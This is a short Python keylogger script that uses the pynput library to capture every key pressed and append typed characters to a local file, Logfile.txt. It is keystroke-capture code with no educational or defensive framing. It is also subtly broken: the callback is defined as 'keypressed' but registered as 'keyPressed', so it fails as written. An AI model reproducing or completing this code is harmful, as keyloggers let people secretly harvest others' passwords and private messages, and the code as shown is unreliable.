from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("Logfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except: 
            print("error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()